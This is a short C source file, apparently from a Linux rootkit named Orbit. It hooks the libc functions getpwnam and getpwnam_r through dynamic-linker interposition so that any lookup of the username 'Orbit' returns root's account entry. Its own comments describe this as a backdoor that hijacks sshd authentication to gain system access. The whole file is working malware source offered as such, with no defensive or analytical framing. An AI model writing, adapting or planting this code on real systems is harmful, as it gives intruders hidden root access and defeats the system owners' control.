#include "orBit.h"

/*
 * \fn struct passwd *getpwnam ( const char *)
 * \brief To make our backdoor operational, hooking the getpwnam function is necessary. This operation allows Orbit to obtain system access rights by hijacking the authentication process carried out by sshd.
 */
struct passwd *getpwnam( const char *name )
{
    static struct passwd *( *orig_getpwnam ) ( const char *) = NULL;
    if ( ! orig_getpwnam )
        orig_getpwnam = (struct passwd *(*) ( const char *)) dlsym ( RTLD_NEXT, "getpwnam");

    if ( _orBit_strcmp( name, "Orbit" ) == 0 )
        return ( orig_getpwnam( "root" ) );
    return ( orig_getpwnam( name ) );
}

/*
 * \fn int getpwnam_r( const char *, struct passwd *, char *, size_t, struct passwd ** )
 * \brief To make our backdoor operational, hooking the getpwnam_r function is necessary. This operation allows Orbit to obtain system access rights by hijacking the authentication process carried out by sshd.
 */
int getpwnam_r( const char *name, struct passwd *pwbuf, char *buf, size_t buflen, struct passwd **pwbufp )
{
    static int (*orig_getpwnam_r) ( const char *, struct passwd *, char *, size_t, struct passwd ** ) = NULL;
    if ( ! orig_getpwnam_r )
        orig_getpwnam_r = ( int (*)( const char *, struct passwd *, char *, size_t, struct passwd ** ))dlsym( RTLD_NEXT, "getpwnam_r");

    if ( _orBit_strcmp( name, "Orbit" ) == 0 )
        return ( orig_getpwnam_r( "root", pwbuf, buf, buflen, pwbufp ));
    return ( orig_getpwnam_r( name, pwbuf, buf, buflen, pwbufp ));
}
